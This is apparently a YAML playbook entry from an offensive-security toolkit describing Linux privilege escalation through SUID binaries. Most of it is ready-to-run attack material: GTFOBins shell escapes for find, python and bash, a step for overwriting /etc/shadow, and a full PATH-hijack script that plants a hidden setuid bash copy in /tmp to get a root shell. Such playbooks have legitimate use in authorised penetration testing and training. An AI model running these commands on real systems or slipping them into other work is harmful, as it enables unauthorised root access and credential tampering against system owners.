id: suid-binary-escalation
name: "Linux PE — SUID binary abuse"
description: >
  SUID-root binary in the wild → check GTFOBins for the SUID variant. If
  a custom binary, reverse it for shell-out, env, or relative-path
  hijack opportunities.
tags: [linux, priv-esc, suid, gtfobins]
difficulty: easy

inputs:
  - name: suid_binaries
    description: "Array from linux-priv-esc-recon (or run `find / -perm -4000` yourself)."

steps:
  - id: list_suid
    name: "Re-list SUID binaries"
    inline_command: "find / -perm -4000 -type f 2>/dev/null"
    capture:
      - var: suid_binaries
        regex: '^(/[^\s]+)$'
        match: all

  - id: triage
    name: "Triage: GTFOBins-known vs custom"
    inline_command: "echo 'Filter your SUID list against gtfobins/. Anything NOT in GTFOBins is likely custom — read it / ltrace it / strings it.'"
    notes: |
      Known SUID quickwins (try first, all in commands/gtfobins/):
       • find        → -exec /bin/sh -p \; -quit
       • cp          → overwrite /etc/shadow with attacker hash
       • python      → -c 'import os; os.execl("/bin/sh","sh","-p")'
       • bash        → bash -p
       • nmap        → --interactive (old) / nse script
       • screen / tmux

  - id: custom_binary
    name: "Custom SUID — common vectors"
    inline_command: "strings /path/to/binary | head -50; ltrace /path/to/binary 2>&1 | head -20"
    notes: |
      Look for:
        • system("ls") with no abs path → PATH hijack (write `ls` in /tmp,
          export PATH=/tmp:$PATH, run binary).
        • execve("/bin/ls", ...) with $LD_LIBRARY_PATH consulted → library
          hijack.
        • Reading config from $HOME/.something → symlink to /etc/shadow.
        • Calling a wrapper script with relative path → write the wrapper.

  - id: env_abuse
    name: "PATH hijack example"
    inline_command: |
      cat > /tmp/ls <<'EOF'
      #!/bin/sh
      cp /bin/bash /tmp/.r && chmod +s /tmp/.r
      EOF
      chmod +x /tmp/ls
      export PATH=/tmp:$PATH
      /path/to/suid-binary  # triggers /tmp/ls as root
      /tmp/.r -p  # root shell
    notes: |
      Works whenever the SUID binary invokes another command via PATH lookup
      (e.g. system("ls")) without setting a clean environment.

references:
  - title: "GTFOBins — SUID"
    url:   "https://gtfobins.github.io/#+suid"
  - title: "HackTricks — SUID escalation"
    url:   "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#suid"

next_chains:
  - chain: shell-stabilization
    when:   'rooted shell is messy'
    reason: 'Upgrade the new root shell.'
